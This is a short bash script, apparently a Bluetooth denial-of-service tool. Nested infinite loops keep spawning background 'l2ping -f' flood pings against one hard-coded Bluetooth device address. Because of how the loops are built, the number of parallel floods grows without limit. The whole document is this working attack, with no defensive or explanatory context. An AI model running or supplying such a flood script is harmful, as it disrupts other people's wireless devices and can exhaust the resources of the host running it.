#!/bin/bash
while [ 1 -eq 1 ]
do 
i=0
while [ $i -lt 50 ] 
do 
l2ping -f  E5:32:D0:AE:1D:42 
done &
let i=i+1
done
